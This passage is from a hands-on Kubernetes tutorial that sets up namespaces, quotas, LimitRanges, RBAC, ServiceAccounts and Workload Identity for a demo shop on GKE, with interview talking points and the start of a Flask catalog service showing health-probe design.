- **Capacity vs Allocatable, and why small nodes lose proportionally more** — the number that forces the sizing in this whole build
- `max-pods-per-node` as an IP-density lever
- The metadata-server escalation and why `GKE_METADATA` + least-privilege node SA matter
- **Single pool vs three pools: the blast-radius / cost / hardware trade-off, and scale-from-zero taint-on-template**


---

# Part 3 — Namespaces, Governance, RBAC, Workload Identity

From here on, everything is YAML you write by hand.

```bash
mkdir -p ~/shopwave/k8s/{00-namespaces,01-governance,02-rbac,03-identity}
cd ~/shopwave/k8s
```

## 3.1 Namespaces

`00-namespaces/00-prod.yaml`:

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: shopwave-prod
  labels:
    name: shopwave-prod
    env: prod
    team: shopwave
    cost-centre: retail-platform
    pod-security.kubernetes.io/enforce: baseline
    pod-security.kubernetes.io/enforce-version: latest
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/audit-version: latest
    pod-security.kubernetes.io/warn: restricted
    pod-security.kubernetes.io/warn-version: latest
```

`00-namespaces/01-staging.yaml`:

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: shopwave-staging
  labels:
    name: shopwave-staging
    env: staging
    team: shopwave
    cost-centre: retail-platform
    pod-security.kubernetes.io/enforce: baseline
    pod-security.kubernetes.io/warn: restricted
```

`00-namespaces/02-dev.yaml`:

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: shopwave-dev
  labels:
    name: shopwave-dev
    env: dev
    team: shopwave
    cost-centre: retail-platform
    pod-security.kubernetes.io/enforce: baseline
    pod-security.kubernetes.io/warn: restricted
```

`00-namespaces/03-platform.yaml`:

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: platform
  labels:
    name: platform
    env: platform
    pod-security.kubernetes.io/enforce: privileged
```

`00-namespaces/04-monitoring.yaml`:

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: monitoring
  labels:
    name: monitoring
    env: platform
    pod-security.kubernetes.io/enforce: privileged
```

### Pod Security Admission — internals

PSA is an **admission controller compiled into the API server**. It replaced PodSecurityPolicy, which was deprecated in 1.21 and **removed in 1.25**.

> **Why PSP died — a great answer.** PSP had a fatal design flaw: when multiple PSPs matched a pod, the **ordering was non-deterministic** (alphabetical by name, with mutation applied from whichever won). You could not reason about which policy applied. It also required RBAC on the PSP *object* granted to the pod's **ServiceAccount**, which meant the policy was enforced against the wrong subject in half the real cases. PSA is deliberately dumber: three fixed levels, applied per namespace by label. Less flexible, actually comprehensible.

Three **levels**:

| Level | Blocks |
|---|---|
| `privileged` | Nothing |
| `baseline` | `hostNetwork`, `hostPID`, `hostIPC`, `hostPath`, `privileged: true`, adding capabilities beyond a small set, host ports, unsafe sysctls |
| `restricted` | Everything in baseline **plus**: must `runAsNonRoot`, must drop **ALL** capabilities (may re-add only `NET_BIND_SERVICE`), `allowPrivilegeEscalation: false`, seccomp `RuntimeDefault`, only projected/emptyDir/PVC volume types |

Three **modes**: `enforce` (reject), `audit` (log to audit trail), `warn` (return a warning to `kubectl`, still admit).

**The pattern that matters:** `enforce: baseline` + `audit: restricted` + `warn: restricted`. You enforce what your workloads survive **today**, and warn on the standard you're **migrating to**. `kubectl apply` prints the warning, the deploy still succeeds, teams fix violations incrementally. Enforcing `restricted` on day one breaks everything and gets the policy switched off — which is exactly how enterprises fail at this.

> **Gotcha:** PSA evaluates **at pod creation only**. Label a namespace `restricted` and existing running pods are untouched — they only fail on the **next rollout**, which is at 03:00 when a node dies and the ReplicaSet tries to replace a pod. The cluster looks fine right up until it catastrophically isn't. Always dry-run first:
> ```bash
> kubectl label --dry-run=server --overwrite ns shopwave-prod \
>   pod-security.kubernetes.io/enforce=restricted
> ```
> This returns the list of **currently running pods that would violate** — the single most useful PSA command there is.

> **Second gotcha:** PSA is enforced against the **pod**, not the Deployment. A Deployment with a violating template is **accepted**; the ReplicaSet then fails to create pods, and the error only appears in `kubectl describe rs`. `kubectl get deploy` shows `0/3` with no explanation. Same failure shape as the quota bug below — learn to reach for `describe rs`.

### A namespace is not a security boundary

This is the sentence that separates people who have read the docs from people who have run a cluster.

A namespace is a **scope for names, RBAC and quota**. It is not isolation. By default:

- Any pod in `shopwave-dev` can open a TCP connection to `payments.shopwave-prod.svc.cluster.local`. There is no network isolation without **NetworkPolicy**.
- Nodes are shared. A container escape in dev lands you on a node that may run prod pods.
- Cluster-scoped resources (CRDs, PVs, StorageClasses, Nodes) are shared and invisible to namespace scoping.
- CoreDNS resolves **every** namespace for everyone — namespace names and service names are enumerable by any pod.

A namespace becomes a boundary only when you add: **RBAC** (who can act) + **ResourceQuota** (how much) + **NetworkPolicy** (who can talk) + **PSA** (what pods may do) + ideally **separate node pools** (blast radius). For true multi-tenancy with untrusted tenants, you need **separate clusters** or sandboxed runtimes (gVisor) — say this and you sound like you've had the argument for real.

## 3.2 ResourceQuota — the tenancy contract

`01-governance/00-quota-prod.yaml`:

```yaml
apiVersion: v1
kind: ResourceQuota
metadata:
  name: shopwave-prod-quota
  namespace: shopwave-prod
spec:
  hard:
    # FREE TIER: sized for a single 3-node e2-standard-2 pool (~2.8 vCPU allocatable).
    requests.cpu: "2500m"
    requests.memory: 5Gi
    limits.cpu: "6"
    limits.memory: 10Gi
    requests.ephemeral-storage: 8Gi
    limits.ephemeral-storage: 16Gi
    requests.storage: 60Gi
    persistentvolumeclaims: "6"
    pods: "40"
    services: "20"
    services.loadbalancers: "1"
    services.nodeports: "0"
    secrets: "40"
    configmaps: "40"
    count/deployments.apps: "20"
    count/statefulsets.apps: "4"
    count/jobs.batch: "10"
    count/cronjobs.batch: "5"
    count/ingresses.networking.k8s.io: "2"
```

### Two deliberate lines worth defending

**`services.nodeports: "0"`** — hard-blocks NodePort creation. In a private cluster with a WAF in front, NodePort is a side door around your entire ingress security posture. Setting it to zero is a **policy statement expressed as a quota**, and it's much harder to bypass than a wiki page.

**`services.loadbalancers: "2"`** — each is a billed GCP forwarding rule with a public IP. Ungoverned, developers create twenty and finance calls you. This is the FinOps control that costs nothing to implement.

**`requests.storage` and `persistentvolumeclaims`** — PVs are the resource people forget. A runaway StatefulSet provisioning 100 × 100 GiB PDs is a five-figure surprise.

### Scoped quota — reserving priority

`01-governance/01-quota-critical.yaml`:

```yaml
apiVersion: v1
kind: ResourceQuota
metadata:
  name: shopwave-prod-critical-quota
  namespace: shopwave-prod
spec:
  hard:
    pods: "12"
    requests.cpu: "4"
    requests.memory: 8Gi
  scopeSelector:
    matchExpressions:
      - operator: In
        scopeName: PriorityClass
        values:
          - shopwave-critical
```

Without this, a team labels all 60 pods `shopwave-critical` and wins every preemption fight, defeating the entire priority scheme. **Rationing high priority by quota** is the control that makes PriorityClasses actually work, and almost nobody mentions it.

Other scopes: `Terminating` / `NotTerminating` (pods with an `activeDeadlineSeconds`), `BestEffort` / `NotBestEffort` (by QoS class). Quota on `BestEffort` pods is how you stop teams shipping unrequested workloads that get evicted first and page you.

### The ResourceQuota rule that trips everyone

> **If a namespace has a quota on `requests.cpu`, every container must declare a CPU request — or the pod is rejected outright** with `failed quota: must specify requests.cpu`. Not defaulted. **Rejected.**

The symptom is vicious: `kubectl get deploy` shows `0/3` READY and **`kubectl get pods` shows nothing at all** — because the *ReplicaSet controller* is being denied at admission, so no pod object is ever created. There is nothing to describe. You must go up a level:

```bash
kubectl describe rs -n shopwave-prod -l app.kubernetes.io/name=orders
kubectl get events -n shopwave-prod --sort-by=.lastTimestamp
```

and you'll see `Error creating: pods "orders-abc-" is forbidden: failed quota`.

**This is one of the highest-value troubleshooting answers you can give in a Kubernetes interview.** The fix is the next object.

## 3.3 LimitRange — defaults and guardrails

`01-governance/02-limitrange-prod.yaml`:

```yaml
apiVersion: v1
kind: LimitRange
metadata:
  name: shopwave-prod-limits
  namespace: shopwave-prod
spec:
  limits:
    - type: Container
      default:
        cpu: 200m
        memory: 256Mi
        ephemeral-storage: 1Gi
      defaultRequest:
        cpu: 100m
        memory: 128Mi
        ephemeral-storage: 256Mi
      min:
        cpu: 50m
        memory: 64Mi
      max:
        cpu: "2"
        memory: 4Gi
      maxLimitRequestRatio:
        cpu: "4"
        memory: "2"
    - type: Pod
      max:
        cpu: "4"
        memory: 8Gi
    - type: PersistentVolumeClaim
      min:
        storage: 1Gi
      max:
        storage: 50Gi
```

### How LimitRange and ResourceQuota interact — the interview answer

> **LimitRange is a *mutating* admission controller. ResourceQuota is a *validating* one.**
>
> Order of operations: LimitRange injects `defaultRequest` and `default` into any container that omitted them → **then** ResourceQuota counts the now-populated values against `hard`.
>
> Without LimitRange, quota **rejects**. With it, quota **admits with sane defaults**. They are designed as a pair; **deploying ResourceQuota without LimitRange is a half-finished configuration** and it will page you.

This ordering — mutating admission runs before validating admission — is a general API-server fact worth stating explicitly: *webhooks and built-in controllers run mutating first, then schema validation, then validating admission*. It's why a mutating webhook can fix an object that a validating webhook would have rejected.

### `maxLimitRequestRatio` — the overcommit cap

A pod requesting `128Mi` with a `4Gi` limit is **scheduled as if it were tiny** and then eats the node. That's the noisy-neighbour pattern. `memory: "2"` forces the limit within 2× the request — honest sizing.

CPU can be looser (`"4"`) because of the distinction that underpins every QoS question you will ever get:

> **CPU is compressible. Memory is incompressible.**
>
> Exceed your CPU limit → the kernel **CFS throttles** you. You get slower. Nothing dies.
> Exceed your memory limit → the kernel **OOM-kills** the container. Exit code 137. Instantly, with no warning and no graceful shutdown.

### QoS classes — assigned, never declared

The kubelet derives a pod's QoS class; you cannot set it:

| Class | Condition | Eviction order |
|---|---|---|
| **Guaranteed** | Every container has requests **==** limits for **both** CPU and memory | Evicted **last** |
| **Burstable** | At least one request set, but not equal to limits | Middle |
| **BestEffort** | **No** requests or limits at all | Evicted **first** |

Under node memory pressure the kubelet evicts BestEffort first, then Burstable pods **exceeding their requests** (ranked by how far over they are), then Guaranteed. Guaranteed pods also get an `oom_score_adj` of **-997**, making the kernel OOM killer avoid them and shoot a BestEffort pod instead.

> **The nuance that impresses:** Guaranteed pods on a static-CPU-policy kubelet get **exclusive pinned CPU cores** — no CFS quota, no throttling, better cache locality. That's why latency-critical services (`payments`) are Guaranteed and it's not just about eviction ranking. On GKE this needs the `static` CPU manager policy on the node pool.

## 3.4 RBAC

### ServiceAccounts

`03-identity/00-serviceaccounts.yaml`:

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: frontend
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: frontend
    app.kubernetes.io/part-of: shopwave
automountServiceAccountToken: false
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: catalog
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: catalog
    app.kubernetes.io/part-of: shopwave
automountServiceAccountToken: false
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: cart
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: cart
    app.kubernetes.io/part-of: shopwave
automountServiceAccountToken: false
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: orders
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: orders
    app.kubernetes.io/part-of: shopwave
automountServiceAccountToken: false
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: payments
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: payments
    app.kubernetes.io/part-of: shopwave
  annotations:
    iam.gke.io/gcp-service-account: shopwave-payments@kubernetas-console.iam.gserviceaccount.com
automountServiceAccountToken: false
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: inventory
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: inventory
    app.kubernetes.io/part-of: shopwave
# inventory DOES need the API — it runs leader election via Lease
automountServiceAccountToken: true
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: notifications
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: notifications
    app.kubernetes.io/part-of: shopwave
  annotations:
    iam.gke.io/gcp-service-account: shopwave-notifications@kubernetas-console.iam.gserviceaccount.com
automountServiceAccountToken: false
```

**One SA per service. Never `default`.** The `default` SA is shared by every pod that doesn't request one — grant it anything and you have granted it to the entire namespace, forever, invisibly.

**`automountServiceAccountToken: false` as the default posture.** Most application pods never call the Kubernetes API. Mounting a token into them is pure attack surface: an RCE in `frontend` becomes a **cluster credential**. Set it `false` at the SA level and opt in per-pod for the few workloads that genuinely need it (`inventory` does, for leader election).

> **Token internals — asked more often than you'd think.** Before 1.24, creating an SA auto-created a **Secret** containing a **never-expiring JWT**. That token in `etcd`, in a backup, in a `kubectl get secret -o yaml` in a Slack thread, was a permanent cluster credential. Since 1.24 (**BoundServiceAccountTokenVolume**, GA in 1.22, legacy secrets removed in 1.24), tokens are **projected volumes**: time-bound (default 1h), **audience-scoped**, and **bound to the pod object's UID** — so when the pod dies, the token is dead even before it expires. The kubelet rotates it in place at 80% of TTL. If you need a long-lived token today you must create the Secret explicitly with `kubernetes.io/service-account-token` type, and you should have a very good reason.

### Roles

`02-rbac/00-role-developer.yaml`:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: shopwave-developer
  namespace: shopwave-prod
rules:
  - apiGroups: [""]
    resources: ["pods", "services", "configmaps", "endpoints", "persistentvolumeclaims"]
    verbs: ["get", "list", "watch"]
  - apiGroups: [""]
    resources: ["pods/log", "pods/status"]
    verbs: ["get", "list"]
  - apiGroups: ["apps"]
    resources: ["deployments", "replicasets", "statefulsets", "daemonsets"]
    verbs: ["get", "list", "watch"]
  - apiGroups: ["apps"]
    resources: ["deployments/status", "statefulsets/status"]
    verbs: ["get"]
  - apiGroups: ["batch"]
    resources: ["jobs", "cronjobs"]
    verbs: ["get", "list", "watch"]
  - apiGroups: ["autoscaling"]
    resources: ["horizontalpodautoscalers"]
    verbs: ["get", "list", "watch"]
  - apiGroups: ["networking.k8s.io"]
    resources: ["ingresses", "networkpolicies"]
    verbs: ["get", "list", "watch"]
  - apiGroups: [""]
    resources: ["events"]
    verbs: ["get", "list", "watch"]
  - apiGroups: ["metrics.k8s.io"]
    resources: ["pods", "nodes"]
    verbs: ["get", "list"]
```

Read-only in prod. Two deliberate details:

- **`pods/log` is a subresource and needs its own rule.** `pods: ["get"]` does **not** grant logs. Same for `pods/exec`, `pods/portforward`, `pods/attach`, `deployments/scale`. This trips up nearly everyone and is a favourite interview question.
- **`pods/exec` is deliberately absent.** Exec into a prod pod is an interactive shell inside your PCI scope, running with the application's identity and network access. That is break-glass, not a daily grant.
- **`secrets` is deliberately absent.** `get secrets` in a namespace is equivalent to reading every credential the namespace has. Read access to Secrets is read access to the database.

`02-rbac/01-role-sre.yaml`:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: shopwave-sre
  namespace: shopwave-prod
rules:
  - apiGroups: ["", "apps", "batch", "autoscaling", "policy", "networking.k8s.io"]
    resources: ["*"]
    verbs: ["*"]
  - apiGroups: [""]
    resources: ["pods/exec", "pods/portforward"]
    verbs: ["create"]
```

`02-rbac/02-role-breakglass.yaml`:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: shopwave-breakglass
  namespace: shopwave-prod
  annotations:
    shopwave.io/purpose: "Incident-only. Binding is created by IC and deleted at incident close. Every use is audited."
rules:
  - apiGroups: [""]
    resources: ["pods/exec"]
    verbs: ["create"]
  - apiGroups: [""]
    resources: ["secrets"]
    verbs: ["get", "list"]
```

The break-glass **Role exists permanently; the RoleBinding does not.** The incident commander creates the binding, and it's deleted at incident close. Every `exec` lands in the GKE audit log. That's a real enterprise control and a strong thing to describe.

### RoleBindings

`02-rbac/10-rolebinding-developer.yaml`:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: shopwave-developers
  namespace: shopwave-prod
subjects:
  - kind: Group
    name: shopwave-developers@yourcompany.com
    apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: Role
  name: shopwave-developer
  apiGroup: rbac.authorization.k8s.io
```

`02-rbac/11-rolebinding-sre.yaml`:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: shopwave-sres
  namespace: shopwave-prod
subjects:
  - kind: Group
    name: shopwave-sre@yourcompany.com
    apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: Role
  name: shopwave-sre
  apiGroup: rbac.authorization.k8s.io
```

> **Bind to Groups, never users.** Joining a team becomes a Google Workspace group membership change, not a cluster change with a PR and a rollout. This is the single biggest RBAC-at-scale lesson: **identity lifecycle belongs in the IdP, not in your manifests.** A cluster with 200 individual user bindings is a cluster where nobody has been offboarded correctly.

### RBAC internals you must know cold

- **RBAC is purely additive. There is no `deny`.** Effective permissions are the **union** of every binding that matches you. You cannot subtract. This is *why* granular Roles matter — you cannot patch over a bad grant, you can only find and remove it.
- **`roleRef` is immutable.** To point a binding at a different Role, you delete and recreate. Deliberate: it prevents silent privilege escalation by patching a binding.
- **The escalation guard.** You cannot create a Role granting permissions you don't yourself hold — unless you have the `escalate` verb on `roles`. Similarly, you cannot bind a Role you don't hold without the `bind` verb. This is why `cluster-admin` is the only identity that can freely mint roles, and why handing out `escalate` is equivalent to handing out `cluster-admin`.

**The four combinations — and the one they ask about:**

| Role kind | Binding kind | Scope |
|---|---|---|
| `Role` | `RoleBinding` | Permissions in **one** namespace |
| `ClusterRole` | `ClusterRoleBinding` | Cluster-wide, all namespaces + cluster-scoped resources |
| **`ClusterRole`** | **`RoleBinding`** | **Define the rules once, grant them within a single namespace** |
| `Role` | `ClusterRoleBinding` | **Invalid.** Does not exist. |

The third is the one that gets asked. It's how you define a `developer` ClusterRole **once** and grant it in 50 namespaces without duplicating rules 50 times. It's the standard multi-tenant pattern.

> **Cluster-scoped resources (Nodes, PVs, StorageClasses, Namespaces, CRDs) can only be granted via ClusterRoleBinding.** A RoleBinding referencing a ClusterRole that grants `nodes` silently grants **nothing** — no error, no warning, just a permission that doesn't work. Excellent gotcha.

- **Aggregated ClusterRoles.** `view`, `edit`, `admin` are built from `aggregationRule` label selectors. Adding a CRD? Label a ClusterRole `rbac.authorization.k8s.io/aggregate-to-view: "true"` and the controller **merges your rules into the built-in `view` role automatically**. That's how operators extend RBAC without you editing built-ins.
- **`resources: ["*"]` includes CRDs installed later.** Convenient, and a real privilege-creep vector — you grant `*` today and inherit permissions on an operator installed next quarter.

### Test it — what an SRE actually does

```bash
kubectl auth can-i delete pods -n shopwave-prod \
  --as=user@yourcompany.com \
  --as-group=shopwave-developers@yourcompany.com

kubectl auth can-i --list -n shopwave-prod \
  --as-group=shopwave-developers@yourcompany.com

# What can this pod's identity do?
kubectl auth can-i --list \
  --as=system:serviceaccount:shopwave-prod:inventory

# Who can read secrets in prod? (needs kubectl-who-can, but know it exists)
kubectl auth can-i get secrets -n shopwave-prod --as=system:serviceaccount:shopwave-prod:frontend
```

`--as` is **impersonation**, itself an RBAC verb (`impersonate`). Being able to impersonate is being able to become — grant it only to admins.

> **GKE gotcha, and it's a big one.** Your **GCP IAM roles layer on top of Kubernetes RBAC**, and the union wins. `roles/container.admin` gives you effective `cluster-admin` **no matter what RBAC you write**. Kubernetes RBAC can only meaningfully restrict identities that are *not* already IAM-privileged. This is why mature GKE shops give humans `roles/container.viewer` (which grants only the ability to authenticate to the endpoint) and do **all** real authorisation in RBAC. Candidates who don't know this design RBAC that does nothing.

## 3.5 Workload Identity

`payments` needs Secret Manager. No JSON keys — ever.

```bash
# 1. Create the Google Service Account
gcloud iam service-accounts create shopwave-payments \
  --display-name="Shopwave payments service"

# 2. Grant the GSA its GCP permissions (least privilege)
gcloud secrets add-iam-policy-binding shopwave-stripe-key \
  --member="serviceAccount:shopwave-payments@$PROJECT_ID.iam.gserviceaccount.com" \
  --role="roles/secretmanager.secretAccessor"

# 3. THE BINDING: allow the KSA to impersonate the GSA
gcloud iam service-accounts add-iam-policy-binding \
  shopwave-payments@$PROJECT_ID.iam.gserviceaccount.com \
  --role="roles/iam.workloadIdentityUser" \
  --member="serviceAccount:$PROJECT_ID.svc.id.goog[shopwave-prod/payments]"
```

Step 3's member format is exact and unforgiving: `PROJECT.svc.id.goog[NAMESPACE/KSA_NAME]`.

> **Both halves are required and people always forget one.**
> - The **annotation on the KSA** (`iam.gke.io/gcp-service-account`) points **Kubernetes → GCP**.
> - The **`workloadIdentityUser` IAM binding** points **GCP → Kubernetes**.
>
> One without the other fails with an opaque `403: Permission denied` or `unable to impersonate`. Propagation is also eventually-consistent — a fresh binding can take **60+ seconds**, so "it didn't work so I changed five things" is how people waste an afternoon. Wait, then retry.

### The token exchange — know this flow

1. The pod's client library requests a token from `http://169.254.169.254/...` (the standard GCP metadata endpoint).
2. The **GKE metadata server** — a DaemonSet on every node with `GKE_METADATA` — intercepts it. The raw GCE metadata server is unreachable from the pod.
3. It fetches a **projected ServiceAccount token** from the kubelet: a JWT, signed by the cluster's OIDC issuer, **audience-scoped** to `PROJECT.svc.id.goog`, short-lived, and bound to the pod UID.
4. It calls **GCP STS**, exchanging the OIDC token for a federated token. STS validates the signature against the cluster's **public OIDC issuer** (`https://container.googleapis.com/v1/projects/.../clusters/...`) and checks the `workloadIdentityUser` binding.
5. It calls **IAM Credentials API** `generateAccessToken` to impersonate the GSA.
6. It returns a **GSA access token, ~1 hour TTL**, and caches/refreshes it.

**Nothing durable ever touches disk.** No key file, no Secret, nothing to leak into git or a log. That is the entire point.

### Verify

```bash
kubectl run wi-test -n shopwave-prod --rm -it \
  --image=google/cloud-sdk:slim \
  --overrides='{"spec":{"serviceAccountName":"payments","automountServiceAccountToken":true}}' \
  -- bash

# inside the pod:
gcloud auth list
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email"
```

Must print the **GSA** email (`shopwave-payments@...`), **not** the node's compute SA. If it prints the node SA, `GKE_METADATA` is not enabled on that node pool.

## 3.6 Apply and verify

```bash
kubectl apply -f 00-namespaces/
kubectl apply -f 01-governance/
kubectl apply -f 02-rbac/
kubectl apply -f 03-identity/

kubectl get ns --show-labels
kubectl describe quota -n shopwave-prod
kubectl describe limitrange -n shopwave-prod
kubectl get sa -n shopwave-prod
```

`kubectl describe quota` prints a `Used` vs `Hard` table. **That table is your tenancy dashboard** — it's the first thing to check when a deploy mysteriously creates no pods.

## 3.7 Part 3 interview talking points

- PSA replaced PSP; **why** PSP died (non-deterministic ordering, wrong subject); three levels, three modes
- The `enforce: baseline` + `warn: restricted` migration pattern, and the `--dry-run=server` label trick
- Namespace is a scope, not a boundary — what you must add to make it one
- LimitRange **mutates**, ResourceQuota **validates**, in that order — and quota rejects pods without requests
- The "Deployment shows 0/3 and there are no pods" debugging path → `describe rs`
- CPU compressible (CFS throttle) vs memory incompressible (OOMKill, exit 137)
- The three QoS classes, how they're derived, eviction order, `oom_score_adj`, and CPU pinning for Guaranteed
- All four Role/Binding combinations, especially ClusterRole + RoleBinding
- RBAC is additive, no deny; `roleRef` immutable; the `escalate`/`bind` guard
- Subresources (`pods/log`, `pods/exec`, `deployments/scale`) need explicit rules
- Aggregated ClusterRoles
- Bound SA tokens: projected, audience-scoped, pod-UID-bound, auto-rotated; why legacy Secret tokens were removed in 1.24
- Workload Identity token exchange end to end; both halves of the binding
- GCP IAM overriding RBAC on GKE


---

# Part 4 — The Application

Seven services in Python (Flask + gunicorn). Python because the code stays readable and the Kubernetes concepts stay the star. Every service exposes:

| Endpoint | Purpose |
|---|---|
| `/healthz` | **Liveness** — is the process wedged? Cheap, no dependencies. |
| `/readyz` | **Readiness** — can I serve traffic? Checks dependencies. |
| `/startupz` | **Startup** — have I finished booting? |
| `/metrics` | Prometheus exposition |
| `/` + business routes | The actual work |

> **The probe design principle, stated once and applied everywhere:** *Liveness must never check a dependency.* If `orders` liveness checked Postgres, then a 30-second Postgres blip would cause the kubelet to **kill every orders pod simultaneously**, they'd all restart, all fail liveness again, and you'd have `CrashLoopBackOff` across the fleet — an outage manufactured entirely by your own health check. **Liveness = "is my process alive". Readiness = "should I get traffic".** This single mistake has caused more real outages than almost anything else in Kubernetes, and it is asked in every serious interview.

```bash
mkdir -p ~/shopwave/app/{frontend,catalog,cart,orders,payments,inventory,notifications}
```

## 4.1 `catalog` — product catalogue

`app/catalog/app.py`:

```python
import os
import time
import logging
import json
import signal
import sys
import threading

from flask import Flask, jsonify, request
import psycopg2
from psycopg2.extras import RealDictCursor
from prometheus_client import Counter, Histogram, Gauge, generate_latest, CONTENT_TYPE_LATEST

SERVICE = "catalog"
VERSION = os.getenv("APP_VERSION", "1.0.0")
POD_NAME = os.getenv("POD_NAME", "unknown")
NODE_NAME = os.getenv("NODE_NAME", "unknown")
ZONE = os.getenv("ZONE", "unknown")

DB_HOST = os.getenv("DB_HOST", "postgres")
DB_PORT = int(os.getenv("DB_PORT", "5432"))
DB_NAME = os.getenv("DB_NAME", "shopwave")
DB_USER = os.getenv("DB_USER", "shopwave")
DB_PASSWORD = os.getenv("DB_PASSWORD", "")
CACHE_TTL = int(os.getenv("CACHE_TTL_SECONDS", "60"))
STARTUP_DELAY = int(os.getenv("STARTUP_DELAY_SECONDS", "5"))

# --- structured JSON logging: the only correct choice in Kubernetes ---
class JsonFormatter(logging.Formatter):
    def format(self, record):
        payload = {
            "timestamp": self.formatTime(record),
            "severity": record.levelname,
            "service": SERVICE,
            "version": VERSION,
            "pod": POD_NAME,
            "node": NODE_NAME,
            "message": record.getMessage(),
        }
        if hasattr(record, "trace_id"):
            payload["logging.googleapis.com/trace"] = record.trace_id
        return json.dumps(payload)

handler = logging.StreamHandler(sys.stdout)
handler.setFormatter(JsonFormatter())
log = logging.getLogger(SERVICE)
log.addHandler(handler)
log.setLevel(logging.INFO)

app = Flask(__name__)

REQUESTS = Counter("shopwave_requests_total", "Total requests",
                   ["service", "method", "endpoint", "status"])
LATENCY = Histogram("shopwave_request_duration_seconds", "Request latency",
                    ["service", "endpoint"],
                    buckets=[0.005, 0.01, 0.025, 0.05, 0.1, 0.25, 0.5, 1.0, 2.5, 5.0])
DB_UP = Gauge("shopwave_db_up", "Database reachable", ["service"])
CACHE_SIZE = Gauge("shopwave_cache_items", "Items in local cache", ["service"])

_ready = False
_shutting_down = False
_started_at = time.time()
_cache = {}
_cache_ts = 0
_lock = threading.Lock()


def db_conn():
    return psycopg2.connect(
        host=DB_HOST, port=DB_PORT, dbname=DB_NAME,
        user=DB_USER, password=DB_PASSWORD,
        connect_timeout=3, cursor_factory=RealDictCursor,
    )


def init_schema():
    with db_conn() as conn, conn.cursor() as cur:
        cur.execute("""
            CREATE TABLE IF NOT EXISTS products (
                id          SERIAL PRIMARY KEY,
                sku         TEXT UNIQUE NOT NULL,
                name        TEXT NOT NULL,
                description TEXT,
                price_paise BIGINT NOT NULL,
                currency    TEXT NOT NULL DEFAULT 'INR',
                active      BOOLEAN NOT NULL DEFAULT TRUE,
                created_at  TIMESTAMPTZ NOT NULL DEFAULT NOW()
            );
        """)
        cur.execute("SELECT COUNT(*) AS c FROM products;")
        if cur.fetchone()["c"] == 0:
            cur.executemany(
                "INSERT INTO products (sku, name, description, price_paise) "
                "VALUES (%s, %s, %s, %s) ON CONFLICT DO NOTHING;",
                [
                    ("SW-TEA-001", "Assam Breakfast Tea", "Strong malty CTC, 500g", 44900),
                    ("SW-CFE-002", "Coorg Arabica Beans", "Medium roast, 1kg", 129900),
                    ("SW-SPC-003", "Guntur Chilli Powder", "Extra hot, 250g", 18900),
                    ("SW-RIC-004", "Sona Masoori Rice", "Aged 2 years, 10kg", 89900),
                    ("SW-OIL-005", "Cold Pressed Groundnut Oil", "1 litre", 39900),
                ],
            )
        conn.commit()
    log.info("schema ready")


def warm():
    """Startup work. The startup probe exists to cover exactly this."""
    global _ready
    time.sleep(STARTUP_DELAY)          # simulate slow framework/JIT boot
    for attempt in range(30):
        try:
            init_schema()
            load_cache()
            _ready = True
            log.info("startup complete, ready to serve")
            return
        except Exception as e:
            log.warning(f"startup attempt {attempt}: {e}")
            time.sleep(2)
    log.error("startup failed permanently")


def load_cache():
    global _cache, _cache_ts
    with db_conn() as conn, conn.cursor() as cur:
        cur.execute("SELECT * FROM products WHERE active = TRUE ORDER BY id;")
        rows = cur.fetchall()
    with _lock:
        _cache = {r["sku"]: dict(r) for r in rows}
        _cache_ts = time.time()
    CACHE_SIZE.labels(SERVICE).set(len(_cache))


def cached():
    if time.time() - _cache_ts > CACHE_TTL:
        try:
            load_cache()
        except Exception as e:
            log.warning(f"cache refresh failed, serving stale: {e}")
    with _lock:
        return list(_cache.values())


# ---------------- probes ----------------

@app.get("/healthz")
def healthz():
    """LIVENESS. Process-local only. NEVER touches the database.
    If this checked the DB, a DB blip would kill every replica at once."""
    return jsonify(status="alive", service=SERVICE, pod=POD_NAME,
                   uptime=round(time.time() - _started_at, 1)), 200


@app.get("/startupz")
def startupz():
    """STARTUP. Gates liveness+readiness until boot finishes."""
    if _ready:
        return jsonify(status="started"), 200
    return jsonify(status="starting"), 503


@app.get("/readyz")
def readyz():
    """READINESS. Dependency-aware. Fails => removed from Endpoints,
    but the pod is NOT killed. This is the correct place to check the DB."""
    if _shutting_down:
        return jsonify(status="draining"), 503
    if not _ready:
        return jsonify(status="starting"), 503
    try:
        with db_conn() as conn, conn.cursor() as cur:
            cur.execute("SELECT 1;")
        DB_UP.labels(SERVICE).set(1)
        return jsonify(status="ready", db="up"), 200
    except Exception as e:
        DB_UP.labels(SERVICE).set(0)
        log.warning(f"readiness failed: {e}")
        return jsonify(status="not-ready", db="down", error=str(e)), 503


@app.get("/metrics")
def metrics():
    return generate_latest(), 200, {"Content-Type": CONTENT_TYPE_LATEST}


# ---------------- business ----------------

@app.get("/api/products")
def list_products():
    t0 = time.time()
    items = cached()
    q = request.args.get("q")
    if q:
        items = [p for p in items if q.lower() in p["name"].lower()]
